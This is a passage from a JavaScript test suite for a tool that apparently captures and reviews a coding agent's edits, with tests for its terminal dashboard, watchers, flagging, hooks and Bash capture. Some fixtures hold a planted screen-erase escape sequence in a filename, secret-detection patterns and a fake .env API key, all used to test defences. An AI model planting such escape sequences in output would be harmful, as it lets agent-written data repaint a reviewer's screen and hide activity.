  assert.equal(tui.displayWidth(rows[0]), tui.displayWidth(rows[1]), 'so both rows stay the same width');
});

test('dashframe: hostile cell text cannot repaint the screen', () => {
  // A tool argument reaches a frame raw. An unsanitised ESC[2J here would clear the dashboard and
  // redraw over it — from data an agent wrote, not from anything the user typed.
  const frame = tui.renderDashFrame(dashFixture(), { cols: 100, rows: 20, color: false });
  const joined = frame.join('\n');
  assert.ok(!joined.includes('\x1b[2J'), 'the planted erase never reaches the frame');
  assert.ok(joined.includes('evil.ts'), 'while the surrounding filename is still shown');
});

test('dashframe: identical state renders identically, and time is injected', () => {
  const a = tui.renderDashFrame(dashFixture(), { cols: 100, rows: 20, color: false });
  const b = tui.renderDashFrame(dashFixture(), { cols: 100, rows: 20, color: false });
  assert.deepEqual(a, b, 'a pure function of state — otherwise snapshots compare two different renders');
  const later = tui.renderDashFrame(dashFixture({ now: 5_000_000 + 3600_000 }), { cols: 100, rows: 20, color: false });
  assert.notDeepEqual(a, later, 'and `now` really is the clock the frame reads');
});

test('dashframe: color:false emits no escapes at all', () => {
  // The CLI's own renderers decide colour from process.stdout.isTTY at call time, which is exactly
  // what makes them untestable. This one takes it as an argument.
  const frame = tui.renderDashFrame(dashFixture({ screen: 'audit' }), { cols: 90, rows: 20, color: false });
  assert.ok(!frame.some((l) => l.includes('\x1b')), 'no escape survives when colour is off');
  const colored = tui.renderDashFrame(dashFixture({ screen: 'audit' }), { cols: 90, rows: 20, color: true });
  assert.ok(colored.some((l) => l.includes('\x1b')), 'and colour is actually applied when it is on');
});

test('dashframe: selection means something different on each screen, deliberately', () => {
  // A key that means "one edit" on one screen and "every edit in the session" on another is how a
  // reviewer destroys work they meant to keep. Each screen states its own answer.
  assert.deepEqual(tui.selectionIds(dashFixture({ screen: 'edits', cursor: 0 }), 'one'), [1]);
  assert.deepEqual(tui.selectionIds(dashFixture({ screen: 'edits' }), 'all'), [1, 2, 3]);
  assert.deepEqual(tui.selectionIds(dashFixture({ screen: 'prompts', cursor: 0 }), 'one'), [1, 3], 'a prompt resolves to the edits it produced');
  // Observation screens carry no edit set, and the runtime prints why rather than doing nothing.
  for (const screen of ['audit', 'feed', 'agents', 'tasks', 'workflows']) {
    assert.deepEqual(tui.selectionIds(dashFixture({ screen }), 'all'), [], `${screen} rows are observations, not edits`);
  }
  // The filter narrows "all" — accepting everything listed must mean what is on screen.
  assert.deepEqual(tui.selectionIds(dashFixture({ screen: 'edits', filter: 'a.ts' }), 'all'), [1]);
});

test('watch: recursion is chosen by PLATFORM, never by try/catch', () => {
  // The only instrument that can catch this. Node does not throw for a recursive watch on Linux — since
  // v19.1 it silently substitutes a per-FILE watcher that opens one handle per file (11,401 measured on
  // an 11k-file store) and emits a synthetic event for each during its walk. A try/catch waiting to
  // select the poll fallback therefore never fires, and a runtime probe on a macOS CI machine cannot
  // observe any of it. A pure predicate can.
  assert.equal(core.nativeRecursive('linux'), false, 'Linux must NOT take the recursive path');
  assert.equal(core.nativeRecursive('darwin'), true);
  assert.equal(core.nativeRecursive('win32'), true);
  assert.equal(core.nativeRecursive('freebsd'), false, 'anything without a native recursive watch fans out');
});

test('watch: the store filter accepts logs and rejects the read path own writes', () => {
  freshHome();
  const roots = core.observatoryRoots({ cwd: tmpWork(), session: 'wsess' });
  const store = roots.find((r) => r.kind === 'store');
  assert.ok(store, 'a store root exists');
  const dir = store.dir;
  // Both filename SHAPES reach this: a relative path under a native recursive watch, a bare name under
  // a per-directory fanout. The obvious port of the editors' `name === 'log.jsonl'` matches only one.
  assert.equal(store.relevant('s1/log.jsonl', dir), true, 'recursive shape: relative path');
  assert.equal(store.relevant('log.jsonl', dir), true, 'fanout shape: bare name');
  assert.equal(store.relevant('s1/blobs/deadbeef', dir), false, 'blobs are not review state');
  // These four are written BY the views a refresh renders. Accepting them makes a live surface refresh
  // because it refreshed.
  for (const noise of ['changemap-cache/x/y.json', 'session-meta/s1.json', 'usage-cursors/a.json', 'stats-cache.json']) {
    assert.equal(store.relevant(noise, dir), false, `${noise} must not wake a refresh`);
  }
});

test('watch: a missing root degrades to polling and says so', async () => {
  freshHome();
  const gone = path.join(tmpWork(), 'no-such-dir');
  const degrades = [];
  const w = core.createWatcher({
    roots: [{ dir: gone, kind: 'store', relevant: () => true }],
    onChange: () => {},
    onDegrade: (d, why) => degrades.push({ d, why }),
  });
  try {
    // The store directory is created by capture, not by us, so a fresh machine genuinely has none.
    // Failing silently here would mean a dashboard that never updates and never says why.
    assert.equal(degrades.length, 1, 'the degradation is announced');
    assert.equal(degrades[0].why, 'ENOENT');
    assert.equal(w.stats()[0].mode, 'poll', 'and the root falls back to polling rather than going dark');
  } finally {
    w.close();
  }
});

test('watch: a real write to a session log wakes exactly one refresh', async () => {
  freshHome();
  const S = 'wlive';
  core.ensureStore(S);
  const seen = [];
  const w = core.createWatcher({
    roots: core.observatoryRoots({ cwd: tmpWork(), session: S }),
    onChange: (kind) => seen.push(kind),
    onDegrade: () => {},
  });
  try {
    seedEdit(S, path.join(tmpWork(), 'w.js'), null, 'x\n');
    // WAITED FOR, not slept at. A filesystem event has no deadline: the OS arms the watch and delivers
    // when it delivers, and on a loaded CI runner 900ms was not always enough — this went red on macOS
    // intermittently, on a different Node version each time, which is what a race looks like from the
    // outside. Polling is also strictly faster in the normal case, where the event lands in a few ms.
    const deadline = Date.now() + 10_000;
    while (!seen.includes('store') && Date.now() < deadline) await new Promise((r) => setTimeout(r, 25));
    assert.ok(seen.includes('store'), `a log append woke the store root (saw ${JSON.stringify(seen)})`);

    // …and the debounce still collapses the burst. This has to be measured AFTER the settle above, and
    // over a window longer than the 150ms debounce, or it is asserting about a burst still in flight.
    await new Promise((r) => setTimeout(r, 400));
    assert.ok(seen.filter((k) => k === 'store').length <= 2, `and did not fire once per byte written (saw ${JSON.stringify(seen)})`);
  } finally {
    w.close();
  }
});

test('textwidth: measures display columns, not string length', () => {
  // Each case is one whose string length is a WRONG answer — that gap is the whole reason this
  // module exists, so the comparison against .length is stated rather than implied.
  assert.equal(tui.displayWidth('\x1b[32m✓ ok\x1b[0m'), 4, 'SGR does not occupy columns (length is 13)');
  assert.equal(tui.displayWidth('漢字テスト'), 10, 'East Asian wide chars are 2 columns (length is 5)');
  assert.equal(tui.displayWidth('🔬'), 2, 'astral emoji is 2 columns (length is 2 UTF-16 units)');
  assert.equal(tui.displayWidth('é'), 1, 'a combining mark adds no column (length is 2)');
  assert.equal(tui.displayWidth('plain'), 5, 'plain ASCII still measures as itself');
});

test('textwidth: sanitizeCell disarms frame-hostile escapes and keeps colour', () => {
  // Transcript-derived cells reach a frame raw, so a planted erase in a tool argument would repaint
  // over the dashboard. Colour has to survive the same pass, or every rendered cell goes monochrome.
  assert.equal(tui.sanitizeCell('src/\x1b[2J\x1b[1;1Hfake.ts'), 'src/fake.ts', 'erase + cursor-home removed');
  assert.equal(tui.sanitizeCell('\x1b[32mkeep\x1b[0m'), '\x1b[32mkeep\x1b[0m', 'SGR passes through verbatim');
  assert.equal(tui.sanitizeCell('a\x1b[2Mb'), 'ab', 'uppercase M is delete-lines, not colour');
  assert.equal(tui.sanitizeCell('a\rb'), 'a b', 'CR becomes a space so the width does not shrink');
  assert.ok(!tui.sanitizeCell('a\x1bb').includes('\x1b'), 'a bare ESC cannot survive to swallow the next char');
});

test('textwidth: fitVisible holds the column budget and never leaks an attribute', () => {
  const padded = tui.fitVisible('\x1b[32mab\x1b[0m', 6);
  assert.equal(tui.displayWidth(padded), 6, 'padded to exactly the budget');
  assert.equal((padded.match(/\x1b\[0m/g) || []).length, 1, 'already-closed input is not double-reset');
  const clipped = tui.fitVisible('\x1b[32mabcdef', 3);
  assert.equal(tui.displayWidth(clipped), 3, 'clipped to exactly the budget');
  // A colour opened and then clipped away would bleed into the rest of the row, and on the last row
  // into the user's shell after dash exits.
  assert.ok(clipped.endsWith('\x1b[0m'), 'an open attribute is closed when the text is cut');
  assert.equal(tui.fitVisible('漢字', 3), '漢 ', 'a wide char that would straddle the edge is dropped whole');
  // Wrap, never ellipsize — the standing rule for content text.
  assert.deepEqual(tui.wrapVisible('one two three', 7), ['one two', 'three']);
  assert.ok(tui.wrapVisible('aaaaaaaaaa', 4).every((l) => tui.displayWidth(l) <= 4), 'a long word is hard-broken');
});

test('memory: fileMemories agrees with fileMemory, and builds the index once', () => {
  freshHome();
  // Several sessions touching a shared file set, so the index has something to cross-reference and
  // the per-file form has many logs to revalidate against.
  const files = [];
  for (let f = 0; f < 5; f++) files.push(path.join(tmpWork(), `m${f}.js`));
  for (let s = 0; s < 3; s++) {
    const S = `mem${s}`;
    for (const f of files) {
      const id = seedEdit(S, f, 'a\n', 'a\nb\n');
      if (s === 0) core.setStatus(S, id, 'kept');
      if (s === 1) core.setStatus(S, id, 'undone');
    }
  }
  core.clearFsCache();

  // Equivalence first: a faster wrong answer is not a fix. Deep-equal covers lastVerdict and notes,
  // not just the counters.
  const batch = core.fileMemories(files);
  for (const f of files) assert.deepEqual(batch.get(f), core.fileMemory(f), `batch matches per-file for ${path.basename(f)}`);

  // Then the budget. Counting SYSCALLS, not milliseconds: the defect is a syscall count, and a
  // wall-clock assertion on this path is flaky on CI while this one is exact.
  const fs2 = require('fs');
  const counts = { stat: 0, exists: 0, readdir: 0 };
  const orig = { statSync: fs2.statSync, existsSync: fs2.existsSync, readdirSync: fs2.readdirSync };
  fs2.statSync = (...a) => (counts.stat++, orig.statSync(...a));
  fs2.existsSync = (...a) => (counts.exists++, orig.existsSync(...a));
  fs2.readdirSync = (...a) => (counts.readdir++, orig.readdirSync(...a));
  let batched, perFile;
  try {
    core.clearFsCache();
    core.fileMemories(files); // warm, so both forms are measured in steady state
    counts.stat = counts.exists = counts.readdir = 0;
    core.fileMemories(files);
    batched = { ...counts };
    counts.stat = counts.exists = counts.readdir = 0;
    for (const f of files) core.fileMemory(f);
    perFile = { ...counts };
  } finally {
    Object.assign(fs2, orig);
  }
  // The batch revalidates the index ONCE however many files it is asked about.
  assert.ok(batched.readdir <= 1, `batched readdir ${batched.readdir} <= 1`);
  assert.ok(batched.stat <= 2 * 3 + 2, `batched stat ${batched.stat} stays proportional to sessions, not files`);
  // Positive control: the per-file form pays that cost per file, so if the counters were broken (or
  // the batch silently fell back to per-file) this assertion fails and the budget above cannot pass
  // vacuously.
  assert.ok(perFile.stat >= batched.stat * files.length, `per-file stat ${perFile.stat} scales with files (batched ${batched.stat})`);
});

test('observe: every flag verdict fires, and only for its own trigger', () => {
  // All five verdicts now live in one memoized record, so a mistyped field name or a swapped pattern
  // silently disables a whole flag class rather than failing to compile. Two of these are the reason
  // to care: "possible hard-coded secret" and "adds a debug statement" are what a reviewer scans for.
  // Each alternation branch gets a case, because a regex that loses one branch still matches the rest.
  freshHome();
  const S = 'flagall';
  const seed = (name, added) => seedEdit(S, path.join(tmpWork(), name), 'const z = 0\n', `const z = 0\n${added}\n`);
  const msgs = (id) => core.flagsFor(S, core.findRecord(S, id)).map((f) => f.message).join(' | ');

  for (const marker of ['TODO', 'FIXME', 'XXX', 'HACK']) {
    assert.match(msgs(seed(`m_${marker}.txt`, `// ${marker} later`)), /TODO\/FIXME/, `${marker} raises the marker flag`);
  }
  for (const dbg of ['console.log(x)', 'debugger', 'print(x)', 'dbg!(x)']) {
    assert.match(msgs(seed(`d_${dbg.replace(/\W/g, '')}.txt`, dbg)), /debug statement/, `${dbg} raises the debug flag`);
  }
  for (const secret of ['api_key = "abc"', "api-key: 'abc'", 'secret = "abc"', 'password = "abc"', 'token = "abc"']) {
    assert.match(msgs(seed(`s_${secret.replace(/\W/g, '')}.txt`, secret)), /hard-coded secret/, `${secret} raises the secret flag`);
  }
  // The negative direction, which is what stops every assertion above passing on a flag that always
  // fires: ordinary code raises none of the three.
  const plain = msgs(seed('plain.txt', 'const total = a + b'));
  assert.doesNotMatch(plain, /TODO\/FIXME|debug statement|hard-coded secret/, `ordinary code is unflagged (got: ${plain})`);
  // And the count verdict, which shares the same record.
  const big = seedEdit(S, path.join(tmpWork(), 'big.txt'), Array.from({ length: 40 }, (_, i) => `l${i}`).join('\n') + '\n', 'l0\n');
  assert.match(msgs(big), /large deletion/, 'a large deletion is still counted from the same memo');
});

test('observe: an XXX-only edit earns the flag but not the follow-up step', () => {
  // The flag matches TODO|FIXME|XXX|HACK; the next step matches TODO|FIXME only. Both verdicts are
  // memoized off the same immutable blob pair, and collapsing them onto one boolean — the obvious
  // simplification — silently puts "follow up on the TODO" on edits that never mention one. Measured
  // against a real store, that was 38 invented follow-ups.
  freshHome();
  const S = 'flagsplit';
  const marker = path.join(tmpWork(), 'marker.js');
  const todo = path.join(tmpWork(), 'todo.js');
  const xxxId = seedEdit(S, marker, null, 'const a = 1 // XXX revisit this\n');
  const todoId = seedEdit(S, todo, null, 'const b = 2 // TODO revisit this\n');

  const msgs = (id) => core.flagsFor(S, core.findRecord(S, id)).map((f) => f.message);
  assert.ok(msgs(xxxId).some((m) => /TODO\/FIXME/.test(m)), 'XXX earns the flag');
  assert.ok(msgs(todoId).some((m) => /TODO\/FIXME/.test(m)), 'TODO earns it as well');

  // Filtered to the FOLLOW-UP step specifically: both files are test-less sources, so both also earn
  // an "Add or update tests" step, and asserting on bare file mentions would fail for the wrong reason.
  const followUps = core.heuristicSuggestions(S).filter((s) => s.startsWith('Follow up on the TODO/FIXME'));
  // The positive half is what stops the negative half passing vacuously: if follow-ups ever stopped
  // being generated at all, this fails rather than the marker check quietly succeeding.
  assert.ok(followUps.some((s) => s.includes('todo.js')), 'the TODO edit earns a follow-up step');
  assert.ok(!followUps.some((s) => s.includes('marker.js')), 'the XXX-only edit does not');
});

test('classes: CRLF files and python classes with trailing comments are detected', () => {
  // CRLF brace language
  const br = core.detectClasses('import x;\r\nexport class Foo {\r\n  m() { return 1 }\r\n}\r\nclass Bar {}\r\n');
  assert.equal(br.length, 2, 'both CRLF brace classes found');
  assert.deepEqual([br[0].name, br[0].start, br[0].end], ['Foo', 1, 3]);
  // CRLF python
  const py = core.detectClasses('class P:\r\n    def m(self):\r\n        pass\r\nx = 1\r\n');
  assert.equal(py.length, 1);
  assert.deepEqual([py[0].name, py[0].end], ['P', 2], 'CR does not break the python end-of-line match');
  // python class with a trailing comment must be treated as python (indent span), not brace-matched
  const pyc = core.detectClasses('class C:  # frozen\n    def m(self):\n        d = {}\n    x = 1\nz = 2\n');
  assert.equal(pyc.length, 1);
  assert.deepEqual([pyc[0].name, pyc[0].start, pyc[0].end], ['C', 0, 3], 'span covers the indented body, not the dict brace');
});

test('memory: fileMemory aggregates a file\'s review history across sessions', () => {
  freshHome();
  const F = '/w/critical/api.ts';
  // session A: one accepted, one reverted; session B: one still pending
  const a1 = seedEdit('memA', F, null, 'v1\n');
  const a2 = seedEdit('memA', F, 'v1\n', 'v2\n');
  core.setStatus('memA', a1, 'kept');
  core.setStatus('memA', a2, 'undone');
  seedEdit('memB', F, 'v2\n', 'v3\n');
  seedEdit('memB', '/w/other.ts', null, 'x\n'); // different file — must not leak in
  // a cached Claude analysis for edit a1 becomes a memory note
  const fs2 = require('fs');
  const path2 = require('path');
  const ap = core.analysisPath('memA', 'edit-' + a1);
  fs2.mkdirSync(path2.dirname(ap), { recursive: true });
  fs2.writeFileSync(ap, JSON.stringify({ kind: 'edit', key: 'edit-' + a1, text: '**Summary** adds the v1 handler\nmore', ts: 5 }));

  const m = core.fileMemory(F);
  assert.equal(m.edits, 3, 'counts edits across both sessions');
  assert.equal(m.kept, 1);
  assert.equal(m.undone, 1);
  assert.equal(m.pending, 1);
  assert.equal(m.lastVerdict.status, 'undone', 'newest decided edit wins');
  assert.equal(m.notes.length, 1, 'cached analysis surfaces as a note');
  assert.equal(m.notes[0].text, 'adds the v1 handler', 'Summary prefix stripped');

  assert.equal(core.isRiskyFile(m), false, 'one revert is not yet risky');
  assert.equal(core.isRiskyFile({ ...m, undone: 2, kept: 1 }), true, 'repeat reverts flag as risky');
  assert.equal(core.isRiskyFile({ ...m, undone: 2, kept: 5 }), false, 'mostly-accepted files are not risky');

  const s = core.memorySummary(m, 10 * 60000 + 2000);
  assert.match(s, /3 edits across sessions/, 'summary counts');
  assert.match(s, /50% accepted/, 'summary acceptance rate');
  assert.match(s, /last reverted/, 'summary last verdict');
  assert.equal(core.memorySummary(core.fileMemory('/w/never-touched.ts')), '', 'no history -> empty summary');
});

test('diagnose: flags missing hooks and CLI-off-PATH, clears once installed', () => {
  freshHome();
  const work = tmpWork();
  const byId = (checks, id) => checks.find((c) => c.id === id);

  // Nothing installed yet: hooks are a hard failure with a fix hint.
  let checks = core.diagnose({ cwd: work, binOnPath: true, jqPresent: true });
  assert.equal(byId(checks, 'hooks').level, 'fail', 'missing hooks reported as a failure');
  assert.ok(byId(checks, 'hooks').fix, 'missing hooks carries a fix hint');
  assert.equal(byId(checks, 'settings-json').level, 'ok', 'absent settings.json is not "invalid"');

  // Install the portable, marker-based hook: the hooks check clears.
  core.installHooks('claude-observatory capture #' + core.HOOK_MARKER, core.settingsPath());
  checks = core.diagnose({ cwd: work, binOnPath: true, jqPresent: true });
  assert.equal(byId(checks, 'hooks').level, 'ok', 'hooks now ok');
  assert.equal(byId(checks, 'hook-shape'), undefined, 'marker hook does not trip the legacy warning');

  // The CLI not resolving on PATH is a hard failure (capture would silently no-op).
  const off = core.diagnose({ cwd: work, binOnPath: false, jqPresent: true });
  assert.equal(byId(off, 'bin-path').level, 'fail', 'bin off PATH is a failure');

  // A hand-mangled settings.json is caught before anything else.
  const fs2 = require('fs');
  fs2.writeFileSync(core.settingsPath(), '{ not json');
  const broken = core.diagnose({ cwd: work, binOnPath: true, jqPresent: true });
  assert.equal(byId(broken, 'settings-json').level, 'fail', 'invalid settings.json flagged');
});

test('semver: compareVersions / isNewer order releases correctly', () => {
  assert.equal(core.compareVersions('0.3.0', '0.3.0'), 0);
  assert.equal(core.compareVersions('0.3.1', '0.3.0'), 1);
  assert.equal(core.compareVersions('0.4.0', '0.3.9'), 1);
  assert.equal(core.compareVersions('1.0.0', '0.9.9'), 1);
  assert.equal(core.compareVersions('v0.3.0', '0.3.0'), 0, 'a leading v is ignored');
  assert.equal(core.isNewer('0.4.0', '0.3.0'), true);
  assert.equal(core.isNewer('0.3.0', '0.3.0'), false);
  assert.equal(core.isNewer('0.2.0', '0.3.0'), false, 'an older release is not "newer"');
  assert.deepEqual(core.parseVersion('v1.2.3-beta.1'), [1, 2, 3], 'prerelease suffix ignored');
});

test('review: reviewSummary aggregates per file + acceptance rate; markdown exports', () => {
  freshHome();
  const S = 'reviewsum';
  const A = path.join(tmpWork(), 'a.txt');
  const B = path.join(tmpWork(), 'b.txt');
  seedEdit(S, A, 'x\n', 'x\ny\n');            // #1 pending
  const i2 = seedEdit(S, A, 'x\ny\n', 'x\n');  // #2 -> keep
  const i3 = seedEdit(S, B, 'p\n', 'q\n');     // #3 -> undo
  core.setStatus(S, i2, 'kept');
  core.setStatus(S, i3, 'undone');
  const s = core.reviewSummary(S);
  assert.equal(s.total, 3);
  assert.equal(s.kept, 1);
  assert.equal(s.undone, 1);
  assert.equal(s.pending, 1);
  assert.equal(Math.round(s.acceptanceRate * 100), 50, '1 kept of 2 reviewed = 50%');
  assert.equal(s.files.length, 2, 'two files aggregated');
  assert.equal(s.reverted.length, 1);
  assert.equal(s.reverted[0].id, i3);
  const md = core.reviewSummaryMarkdown(s);
  assert.match(md, /review summary/i);
  assert.match(md, /50%/, 'markdown shows the acceptance rate');
  assert.match(md, /Reverted edits/, 'markdown lists reverted edits');
});

// Run the capture hook for a Bash tool call (no file_path — capture walks cwd).
function runHookBash(home, session, dir, event) {
  const payload = JSON.stringify({
    session_id: session, cwd: dir, hook_event_name: event, tool_name: 'Bash', tool_input: { command: 'true' },
  });
  return cp.execFileSync('node', [CAPTURE], { input: payload, env: { ...process.env, HOME: home }, encoding: 'utf8' });
}

test('capture: Bash tool full-snapshots cwd and records modify/create/delete (undoable)', () => {
  const home = freshHome();
  const dir = tmpWork();
  const A = path.join(dir, 'a.txt'); // modified
  const B = path.join(dir, 'b.txt'); // deleted
  const D = path.join(dir, 'd.txt'); // untouched
  fs.writeFileSync(A, 'one\n');
  fs.writeFileSync(B, 'gone\n');
  fs.writeFileSync(D, 'same\n');
  const S = 'bashSess';
  assert.equal(runHookBash(home, S, dir, 'PreToolUse'), '', 'Pre: no stdout');
  // simulate the Bash command's effects
  fs.writeFileSync(A, 'ONE\n');
  const C = path.join(dir, 'c.txt');
  fs.writeFileSync(C, 'brand new\n'); // created
  fs.unlinkSync(B); // deleted
  assert.equal(runHookBash(home, S, dir, 'PostToolUse'), '', 'Post: no stdout');

  const log = fs
    .readFileSync(path.join(home, '.claude', 'claude-observatory', S, 'log.jsonl'), 'utf8')
    .trim().split('\n').map(JSON.parse);
  const at = (f) => log.find((r) => r.file === f);
  assert.ok(at(A) && at(A).tool === 'Bash', 'modified file recorded as a Bash edit');
  assert.ok(at(A).beforeBlob && at(A).afterBlob && at(A).beforeBlob !== at(A).afterBlob, 'modify: before+after present (undoable)');
  assert.ok(at(C) && at(C).beforeBlob === null && at(C).afterBlob, 'created file: before null');
  assert.ok(at(B) && at(B).beforeBlob && at(B).afterBlob === null, 'deleted file: after null');
  assert.equal(at(D), undefined, 'untouched file produces no edit');
});

test('capture: CLAUDE_OBSERVATORY_NO_BASH opts out of Bash capture', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'a.txt');
  fs.writeFileSync(F, 'one\n');
  const S = 'bashOff';
  const env = { ...process.env, HOME: home, CLAUDE_OBSERVATORY_NO_BASH: '1' };
  const bash = (event) => cp.execFileSync('node', [CAPTURE], {
    input: JSON.stringify({ session_id: S, cwd: dir, hook_event_name: event, tool_name: 'Bash', tool_input: {} }),
    env, encoding: 'utf8',
  });
  bash('PreToolUse');
  fs.writeFileSync(F, 'TWO\n');
  bash('PostToolUse');
  assert.equal(fs.existsSync(path.join(home, '.claude', 'claude-observatory', S, 'log.jsonl')), false, 'no log written when opted out');
});

test('capture: the Bash full-tree walk never snapshots secret files (.env), only ordinary edits', () => {
  const home = freshHome();
  const dir = tmpWork();
  const ENV = path.join(dir, '.env'); // secret — must NOT be captured
  const SRC = path.join(dir, 'app.js'); // ordinary — must be captured
  fs.writeFileSync(ENV, 'API_KEY=sk-secret-000\n');
  fs.writeFileSync(SRC, 'let x = 1;\n');
  const S = 'bashSecret';
  runHookBash(home, S, dir, 'PreToolUse');
  fs.writeFileSync(ENV, 'API_KEY=sk-secret-999\n'); // the Bash command "changed" both
  fs.writeFileSync(SRC, 'let x = 2;\n');
  runHookBash(home, S, dir, 'PostToolUse');

  const log = fs
    .readFileSync(path.join(home, '.claude', 'claude-observatory', S, 'log.jsonl'), 'utf8')
    .trim().split('\n').map(JSON.parse);
  assert.ok(log.some((r) => r.file === SRC), 'ordinary source edit is captured');
  assert.ok(!log.some((r) => r.file === ENV), '.env is never recorded');
  // and its secret content never lands in a blob
  const blobs = fs.readdirSync(path.join(home, '.claude', 'claude-observatory', S, 'blobs'));
  const anySecret = blobs.some((b) =>
    fs.readFileSync(path.join(home, '.claude', 'claude-observatory', S, 'blobs', b), 'utf8').includes('sk-secret')
  );
  assert.ok(!anySecret, 'no blob contains the .env secret');
});

test('store: session dirs are 0700 and blobs 0600 (not world/group-readable)', { skip: process.platform === 'win32' }, () => {
  freshHome();
  const S = 'perms';
  core.ensureStore(S);
  const sha = core.writeBlob(S, Buffer.from('secret-ish\n'));
  const dirMode = fs.statSync(core.storeDir(S)).mode & 0o777;
  const blobMode = fs.statSync(path.join(core.storeDir(S), 'blobs', sha)).mode & 0o777;
  assert.equal(dirMode & 0o077, 0, `store dir must have no group/other bits (got ${dirMode.toString(8)})`);
  assert.equal(blobMode & 0o077, 0, `blob must have no group/other bits (got ${blobMode.toString(8)})`);
});

test('install: re-init migrates a legacy matcher in place (adds Bash) without duplicating', () => {
  const home = freshHome();
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  const sp = path.join(home, '.claude', 'settings.json');
  const cmd = 'claude-observatory capture #claude-observatory-hook';
  // an old install: our command under the pre-Bash matcher
  fs.writeFileSync(sp, JSON.stringify({
    hooks: {
      PreToolUse: [{ matcher: 'Edit|Write|MultiEdit|NotebookEdit', hooks: [{ type: 'command', command: cmd }] }],
      PostToolUse: [{ matcher: 'Edit|Write|MultiEdit|NotebookEdit', hooks: [{ type: 'command', command: cmd }] }],
    },
  }));
  assert.ok(core.installHooks(cmd).changed, 're-init migrates the matcher');
  const d = JSON.parse(fs.readFileSync(sp, 'utf8'));
  assert.equal(d.hooks.PreToolUse.length, 1, 'no duplicate group');
  assert.equal(d.hooks.PreToolUse[0].hooks.length, 1, 'no duplicate command');
  assert.equal(d.hooks.PreToolUse[0].matcher, core.MATCHER, 'matcher upgraded to current');
  assert.ok(core.MATCHER.includes('Bash'), 'MATCHER now includes Bash');
  assert.equal(core.installHooks(cmd).changed, false, 'idempotent after migration');
});

test('tree: buildEditTree groups by folder/file with chain compaction + exact deltas', () => {
  freshHome();
  const S = 'treeview';
  const root = tmpWork();
  const A = path.join(root, 'src', 'a.ts');
  const B = path.join(root, 'src', 'util', 'deep', 'b.ts');
  fs.mkdirSync(path.dirname(A), { recursive: true });
  fs.mkdirSync(path.dirname(B), { recursive: true });
  fs.writeFileSync(A, 'x\ny\n');
  fs.writeFileSync(B, 'p\nq\n');
  seedEdit(S, A, 'x\n', 'x\ny\n');   // +1
  seedEdit(S, B, 'p\n', 'p\nq\n');   // +1

  const tree = core.buildEditTree(S, { root });
  assert.equal(tree.files.length, 0, 'nothing directly at root');
  assert.equal(tree.folders.length, 1, 'one top-level folder');
  const src = tree.folders[0];
  assert.equal(src.label, 'src', 'src not compacted (it holds a file and a subfolder)');
  assert.ok(src.files.some((f) => f.rel === 'src/a.ts'), 'a.ts sits directly under src');
  const util = src.folders.find((d) => d.label === 'util/deep');
  assert.ok(util, 'single-child chain util/deep is compacted into one node');
  assert.equal(util.files[0].rel, 'src/util/deep/b.ts');
  const aFile = src.files.find((f) => f.rel === 'src/a.ts');
  assert.equal(aFile.loose.length, 1, 'edit is loose (no class detected)');
  assert.equal(aFile.loose[0].added, 1, 'exact delta carried on the edit');

  // filter narrows by relative path
  const filtered = core.buildEditTree(S, { root, filter: 'a.ts' });
  const flatFiles = [];
  const walk = (n) => { flatFiles.push(...n.files.map((f) => f.rel)); n.folders.forEach(walk); };
  walk(filtered);
  assert.deepEqual(flatFiles, ['src/a.ts'], 'filter keeps only matching files');
});

test('actions: parseActions builds a typed timeline of every tool call, with results + edit links', () => {
  freshHome();
  const S = 'acts';
  const cwd = tmpWork();
  const F = path.join(cwd, 'app.ts');
  // store: two edits to F so the edit-category actions link to records #1 / #2 positionally.
  seedEdit(S, F, null, 'export const a = 1\n'); // #1
  seedEdit(S, F, 'export const a = 1\n', 'export const a = 2\n'); // #2
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { timestamp: '2026-07-13T10:00:00.000Z', message: { role: 'assistant', content: [
      { type: 'text', text: 'Exploring the code.' },
      { type: 'tool_use', id: 'tu1', name: 'Read', input: { file_path: F } },
      { type: 'tool_use', id: 'tu2', name: 'Grep', input: { pattern: 'const a', path: cwd } },
    ] } },
    { message: { role: 'user', content: [
      { type: 'tool_result', tool_use_id: 'tu1', is_error: false, content: 'ok' },
      { type: 'tool_result', tool_use_id: 'tu2', is_error: true, content: 'grep failed' },
    ] } },
    { timestamp: '2026-07-13T10:01:00.000Z', message: { role: 'assistant', content: [
      { type: 'text', text: 'Creating app.ts.' },
      { type: 'tool_use', id: 'tu3', name: 'Write', input: { file_path: F, content: '...' } },
    ] } },
    { message: { role: 'assistant', content: [{ type: 'thinking', thinking: 'Now run checks.' }] } }, // reasoning, no tool
    { timestamp: '2026-07-13T10:02:00.000Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'tu4', name: 'Bash', input: { command: 'npm test\n--silent', description: 'run tests' } },
      { type: 'tool_use', id: 'tu5', name: 'WebFetch', input: { url: 'https://example.com/docs' } },
      { type: 'tool_use', id: 'tu6', name: 'Agent', input: { description: 'audit deps', subagent_type: 'Explore' } },
      { type: 'tool_use', id: 'tu7', name: 'TodoWrite', input: { todos: [{ content: 'ship it', status: 'in_progress' }, { content: 'done', status: 'completed' }] } },
    ] } },
    { timestamp: '2026-07-13T10:03:00.000Z', message: { role: 'assistant', content: [
      { type: 'text', text: 'Bump to 2.' },
      { type: 'tool_use', id: 'tu8', name: 'Edit', input: { file_path: F } },
    ] } },
    // a subagent (sidechain) line — must be IGNORED (its calls live in subagents/*.jsonl).
    { isSidechain: true, message: { role: 'assistant', content: [{ type: 'tool_use', id: 'sx1', name: 'Read', input: { file_path: '/secret' } }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);

  const acts = core.parseActions(cwd, S);
  const byTool = (t) => acts.find((a) => a.tool === t);
  assert.equal(acts.length, 8, 'every main-chain tool call captured; the sidechain call excluded');

  // categories
  assert.equal(byTool('Read').category, 'read');
  assert.equal(byTool('Grep').category, 'search');
  assert.equal(byTool('Write').category, 'edit');
  assert.equal(byTool('Bash').category, 'exec');
  assert.equal(byTool('WebFetch').category, 'web');
  assert.equal(byTool('Agent').category, 'agent');
  assert.equal(byTool('TodoWrite').category, 'todo');

  // targets (one-line, tool-specific)
  assert.equal(byTool('Read').target, F);
  assert.equal(byTool('Grep').target, 'const a');
  assert.equal(byTool('Bash').target, 'npm test --silent', 'multiline command collapsed to one line');
  assert.equal(byTool('Bash').detail, 'run tests');
  assert.equal(byTool('WebFetch').target, 'https://example.com/docs');
